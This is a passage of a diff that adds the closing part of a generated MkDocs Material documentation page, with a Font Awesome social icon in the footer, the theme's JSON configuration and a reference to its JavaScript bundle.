+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224.3 141a115 115 0 1 0-.6 230 115 115 0 1 0 .6-230m-.6 40.4a74.6 74.6 0 1 1 .6 149.2 74.6 74.6 0 1 1-.6-149.2m93.4-45.1a26.8 26.8 0 1 1 53.6 0 26.8 26.8 0 1 1-53.6 0m129.7 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8M399 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.instant", "navigation.instant.prefetch", "navigation.tracking", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
